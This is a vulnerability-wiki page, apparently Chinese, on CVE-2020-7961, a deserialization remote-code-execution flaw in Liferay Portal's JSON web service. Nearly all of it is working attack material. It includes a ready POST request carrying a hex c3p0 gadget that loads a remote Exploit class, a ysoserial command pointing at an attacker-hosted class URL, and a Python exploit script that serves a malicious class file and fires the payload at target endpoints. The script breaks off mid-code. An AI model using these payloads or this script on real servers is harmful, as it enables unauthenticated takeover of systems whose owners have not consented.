<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Liferay%20Portal/%EF%BC%88CVE-2020-7961%EF%BC%89Liferay%20Portal%20Json%20Web%20Service%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2020-7961）Liferay Portal Json Web Service 反序列化漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2020-7961\uff09Liferay Portal Json Web Service \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Likeshop/Likeshop-formimage%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Likeshop/Likeshop-formimage%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-link">
        Likeshop formimage任意文件上传
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Libssh/CVE-2018-10933/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Libssh/CVE-2018-10933/README.zh-cn/" class="btn btn-xs btn-link">
        libssh 服务端权限认证绕过漏洞（CVE-2018-10933）
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2020-7961liferay-portal-json-web-service">（CVE-2020-7961）Liferay Portal Json Web Service 反序列化漏洞<a class="headerlink" href="#cve-2020-7961liferay-portal-json-web-service" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Liferay Portal 6.1.XLiferay Portal 6.2.XLiferay Portal 7.0.XLiferay Portal 7.1.XLiferay Portal 7.2.X</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">环境搭建<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1">https://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1</a>
下载带tomcat的集成版，接下来就可以运行了，安装过程一路默认配置即可<img alt="1.png" src="../resource/%28CVE-2020-7961%29LiferayPortalJsonWebService%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.png" /><img alt="2.png" src="../resource/%28CVE-2020-7961%29LiferayPortalJsonWebService%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p><strong>poc</strong></p>
<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/api/jsonws/invoke</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org:8080</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">2335</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

<span class="nt">cmd</span><span class="o">=</span><span class="s">{&quot;/expandocolumn/add-column&quot;:{}}</span><span class="p">&amp;</span><span class="nt">p_auth</span><span class="o">=</span><span class="s">o3lt8q1F</span><span class="p">&amp;</span><span class="nt">formDate</span><span class="o">=</span><span class="s">1585270368703</span><span class="p">&amp;</span><span class="nt">tableId</span><span class="o">=</span><span class="s">1</span><span class="p">&amp;</span><span class="nt">name</span><span class="o">=</span><span class="s">2</span><span class="p">&amp;</span><span class="nt">type</span><span class="o">=</span><span class="s">3</span><span class="p">&amp;</span><span class="nt">defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</span><span class="o">=</span><span class="s">{&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:aced000573720028636f6d2e6d6368616e67652e76322e633370302e506f6f6c4261636b656444617461536f75726365de22cd6cc7ff7fa802000078720035636f6d2e6d6368616e67652e76322e633370302e696d706c2e4162737472616374506f6f6c4261636b656444617461536f75726365000000000000000103000078720031636f6d2e6d6368616e67652e76322e633370302e696d706c2e506f6f6c4261636b656444617461536f757263654261736500000000000000010300084900106e756d48656c706572546872656164734c0018636f6e6e656374696f6e506f6f6c44617461536f757263657400244c6a617661782f73716c2f436f6e6e656374696f6e506f6f6c44617461536f757263653b4c000e64617461536f757263654e616d657400124c6a6176612f6c616e672f537472696e673b4c000a657874656e73696f6e7374000f4c6a6176612f7574696c2f4d61703b4c0014666163746f7279436c6173734c6f636174696f6e71007e00044c000d6964656e74697479546f6b656e71007e00044c00037063737400224c6a6176612f6265616e732f50726f70657274794368616e6765537570706f72743b4c00037663737400224c6a6176612f6265616e732f5665746f61626c654368616e6765537570706f72743b7870770200017372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e000a4c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f727971007e00044c0014636c617373466163746f72794c6f636174696f6e71007e00044c0009636c6173734e616d6571007e00047870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f3132372e302e302e313a383938392f7400076578706c6f697470707070770400000000787702000178;&quot;}</span>
</code></pre></div>

<p>本地起http server 挂载Exploit.class字节码文件<img alt="3.png" src="../resource/%28CVE-2020-7961%29LiferayPortalJsonWebService%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId28.png" />ysoserial c3p0生成：</p>
<div class="codehilite"><pre><span></span><code>java -jar ysoserial.jar C3P0 &quot;http://192.168.3.199/:Exploit&quot; &gt; test1.ser
</code></pre></div>

<p>然后用以下脚本转为16进制：</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.</span><span class="o">*</span><span class="p">;</span>

<span class="n">public</span> <span class="k">class</span><span class="w"> </span><span class="nc">poc</span> <span class="p">{</span>
    <span class="n">public</span> <span class="n">String</span> <span class="n">encodeHex</span><span class="p">(</span><span class="n">InputStream</span> <span class="n">fi</span><span class="p">)</span> <span class="n">throws</span> <span class="n">IOException</span> <span class="p">{</span>
        <span class="nb">int</span> <span class="n">size</span><span class="p">;</span>
        <span class="n">String</span> <span class="n">hexStr</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">((</span><span class="n">size</span><span class="o">=</span><span class="n">fi</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">!=-</span><span class="mi">1</span><span class="p">){</span>
            <span class="n">String</span> <span class="n">byteChar</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="n">toHexString</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="n">byteChar</span><span class="o">.</span><span class="n">length</span><span class="p">()</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">byteChar</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span> <span class="o">+</span> <span class="n">byteChar</span><span class="p">;</span>
            <span class="p">}</span>
           <span class="n">hexStr</span> <span class="o">=</span> <span class="n">hexStr</span> <span class="o">+</span> <span class="n">byteChar</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="n">hexStr</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="n">throws</span> <span class="n">IOException</span> <span class="p">{</span>
    <span class="n">FileInputStream</span> <span class="n">fi</span>  <span class="o">=</span> <span class="n">new</span> <span class="n">FileInputStream</span><span class="p">(</span><span class="n">new</span> <span class="n">File</span><span class="p">(</span><span class="n">System</span><span class="o">.</span><span class="n">getProperty</span><span class="p">(</span><span class="s2">&quot;user.dir&quot;</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;/src/main/resources/test.ser&quot;</span><span class="p">));</span>
    <span class="n">poc</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">new</span> <span class="n">poc</span><span class="p">();</span>
    <span class="n">String</span> <span class="n">pocStr</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="n">encodeHex</span><span class="p">(</span><span class="n">fi</span><span class="p">);</span>
    <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="n">pocStr</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>或者用mashalsec直接生成16进制paylaod：<img alt="4.png" src="../resource/%28CVE-2020-7961%29LiferayPortalJsonWebService%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId29.png" /><img alt="1063309202004040921217371034019990.gif" src="../resource/%28CVE-2020-7961%29LiferayPortalJsonWebService%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId30.gif" /></p>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<p><strong>poc.py</strong></p>
<div class="codehilite"><pre><span></span><code><span class="sd">&#39;&#39;&#39;</span>
<span class="sd">    Title: POC for Unauthenticated Remote code execution via JSONWS (LPS-97029/CVE-2020-7961) in Liferay 7.2.0 CE GA1 </span>
<span class="sd">    POC author: mzero</span>
<span class="sd">    Download link: https://sourceforge.net/projects/lportal/files/Liferay%20Portal/7.2.0%20GA1/liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.7z/download</span>
<span class="sd">    Based on https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html research</span>
<span class="sd">    Usage: python poc.py -h</span>

<span class="sd">    Gadget used: C3P0WrapperConnPool</span>

<span class="sd">    Installation:</span>
<span class="sd">    pip install requests</span>
<span class="sd">    pip install bs4</span>

<span class="sd">    Create file LifExp.java with example content:</span>
<span class="sd">    public class LifExp {</span>
<span class="sd">        static {</span>
<span class="sd">        try {</span>
<span class="sd">            String[] cmd = {&quot;cmd.exe&quot;, &quot;/c&quot;, &quot;calc.exe&quot;};</span>
<span class="sd">            java.lang.Runtime.getRuntime().exec(cmd).waitFor();</span>
<span class="sd">        } catch ( Exception e ) {</span>
<span class="sd">            e.printStackTrace();</span>
<span class="sd">            }</span>
<span class="sd">        }</span>
<span class="sd">    }</span>
<span class="sd">    javac LifExp.java</span>
<span class="sd">    Place poc.py and LifExp.class in the same directory.</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">threading</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">binascii</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">bs4</span><span class="w"> </span><span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">datetime</span><span class="w"> </span><span class="kn">import</span> <span class="n">datetime</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">http.server</span><span class="w"> </span><span class="kn">import</span> <span class="n">BaseHTTPRequestHandler</span><span class="p">,</span><span class="n">HTTPServer</span>
<span class="c1">#import http.server</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">requests.packages.urllib3.exceptions</span><span class="w"> </span><span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
<span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>

<span class="c1"># SET proxy</span>
<span class="n">PROXIES</span> <span class="o">=</span> <span class="p">{}</span>
<span class="c1">#PROXIES = {&quot;http&quot;:&quot;http://127.0.0.1:9090&quot;}</span>

<span class="k">class</span><span class="w"> </span><span class="nc">HttpHandler</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s1">&#39;Content-type&#39;</span><span class="p">,</span><span class="s1">&#39;application/java-vm&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;LifExp.class&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">return</span>

<span class="k">def</span><span class="w"> </span><span class="nf">log</span><span class="p">(</span><span class="n">level</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
    <span class="n">prefix</span> <span class="o">=</span> <span class="s2">&quot;[#] &quot;</span>
    <span class="k">if</span> <span class="n">level</span> <span class="o">==</span> <span class="s2">&quot;error&quot;</span><span class="p">:</span>
        <span class="n">prefix</span> <span class="o">=</span> <span class="s2">&quot;[!] &quot;</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%d</span><span class="s2">/%m/%Y %H:%M:%S&quot;</span><span class="p">)</span>
    <span class="n">temp</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">{}</span><span class="s2"> [</span><span class="si">{}</span><span class="s2">] </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">prefix</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">find_href</span><span class="p">(</span><span class="n">body</span><span class="p">):</span>
    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">body</span><span class="p">,</span> <span class="s2">&quot;html.parser&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">href</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">find_class</span><span class="p">(</span><span class="n">body</span><span class="p">,</span> <span class="n">clazz</span><span class="p">):</span>
    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">body</span><span class="p">,</span> <span class="s2">&quot;html.parser&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">soup</span><span class="o">.</span><span class="n">findAll</span><span class="p">(</span><span class="s2">&quot;div&quot;</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;class&quot;</span><span class="p">:</span> <span class="n">clazz</span><span class="p">})</span>

<span class="k">def</span><span class="w"> </span><span class="nf">find_id</span><span class="p">(</span><span class="n">body</span><span class="p">):</span>
    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">body</span><span class="p">,</span> <span class="s2">&quot;html.parser&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">soup</span><span class="o">.</span><span class="n">findAll</span><span class="p">(</span><span class="s2">&quot;form&quot;</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="s2">&quot;execute&quot;</span><span class="p">})</span>

<span class="k">def</span><span class="w"> </span><span class="nf">get_param</span><span class="p">(</span><span class="n">div</span><span class="p">):</span>
    <span class="n">param</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
    <span class="n">param_type</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
    <span class="n">p_name</span> <span class="o">=</span> <span class="n">div</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;span&quot;</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;class&quot;</span><span class="p">:</span> <span class="s2">&quot;lfr-api-param-name&quot;</span><span class="p">})</span>
    <span class="n">p_type</span> <span class="o">=</span> <span class="n">div</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;span&quot;</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;class&quot;</span><span class="p">:</span> <span class="s2">&quot;lfr-api-param-type&quot;</span><span class="p">})</span>
    <span class="k">if</span> <span class="n">p_name</span><span class="p">:</span>
        <span class="n">param</span> <span class="o">=</span> <span class="n">p_name</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">p_type</span><span class="p">:</span>
        <span class="n">param_type</span> <span class="o">=</span> <span class="n">p_type</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>

    <span class="k">return</span> <span class="p">(</span><span class="n">param</span><span class="p">,</span> <span class="n">param_type</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">_do_get</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">PROXIES</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span><span class="w"> </span><span class="nf">do_get</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">{}</span><span class="s2">/</span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">_do_get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span><span class="w"> </span><span class="nf">_do_post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">PROXIES</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span><span class="w"> </span><span class="nf">do_post</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">{}</span><span class="s2">/</span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">_do_post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span><span class="w"> </span><span class="nf">find_endpoints</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">do_get</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
    <span class="n">links</span> <span class="o">=</span> <span class="n">find_href</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">links</span><span class="p">:</span>
        <span class="k">if</span> <span class="s2">&quot;java.lang.Object&quot;</span> <span class="ow">in</span> <span class="n">link</span><span class="p">[</span><span class="s1">&#39;href&#39;</span><span class="p">]:</span>
            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">link</span><span class="p">[</span><span class="s1">&#39;href&#39;</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="k">def</span><span class="w"> </span><span class="nf">find_parameters</span><span class="p">(</span><span class="n">body</span><span class="p">):</span>
    <span class="n">div_params</span> <span class="o">=</span> <span class="n">find_class</span><span class="p">(</span><span class="n">body</span><span class="p">,</span> <span class="s2">&quot;lfr-api-param&quot;</span><span class="p">)</span>
    <span class="n">params</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">div_params</span><span class="p">:</span>
        <span class="n">params</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">get_param</span><span class="p">(</span><span class="n">d</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">params</span>

<span class="k">def</span><span class="w"> </span><span class="nf">find_url</span><span class="p">(</span><span class="n">body</span><span class="p">):</span>
    <span class="n">form</span> <span class="o">=</span> <span class="n">find_id</span><span class="p">(</span><span class="n">body</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">form</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span>

<span class="k">def</span><span class="w"> </span><span class="nf">set_params</span><span class="p">(</span><span class="n">params</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_type</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="k">for</span> <span class="n">param</span> <span class="ow">in</span> <span class="n">params</span><span class="p">:</span>
        <span class="n">p_name</span><span class="p">,</span> <span class="n">p_type</span> <span class="o">=</span> <span class="n">param</span>
        <span class="k">if</span> <span class="n">p_type</span> <span class="o">==</span> <span class="s2">&quot;java.lang.Object&quot;</span><span class="p">:</span>
            <span class="n">result</span><span class="p">[</span><span class="n">p_name</span><span class="o">+</span><span class="s2">&quot;:&quot;</span><span class="o">+</span><span class="n">payload_type</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>

        <span class="n">result</span><span class="p">[</span><span class="n">p_name</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;1&quot;</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="k">def</span><span class="w"> </span><span class="nf">pad</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">length</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">data</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\x20</span><span class="s2">&quot;</span><span class="o">*</span><span class="p">(</span><span class="n">length</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

<span class="k">def</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">api_url</span><span class="p">,</span> <span class="n">params</span><span class="p">,</span> <span class="n">PAYLOAD</span><span class="p">,</span> <span class="n">PAYLOAD_TYPE</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">set_params</span><span class="p">(</span><span class="n">params</span><span class="p">,</span> <span class="n">PAYLOAD</span><span class="p">,</span> <span class="n">PAYLOAD_TYPE</span><span class="p">)</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">do_post</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">api_url</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>

<span class="n">banner</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;POC author: mzero</span><span class="se">\r\n</span><span class="s2">Based on https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html research&quot;&quot;&quot;</span>

<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-t&quot;</span><span class="p">,</span> <span class="s2">&quot;--target-host&quot;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s2">&quot;target&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;target host:port&quot;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-u&quot;</span><span class="p">,</span> <span class="s2">&quot;--api-url&quot;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s2">&quot;api_url&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;path to jsonws. Default: /api/jsonws&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;api/jsonws&quot;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-p&quot;</span><span class="p">,</span> <span class="s2">&quot;--bind-port&quot;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s2">&quot;bind_port&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;HTTP server bind port. Default 9091&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">9091</span><span class="p">)</span>
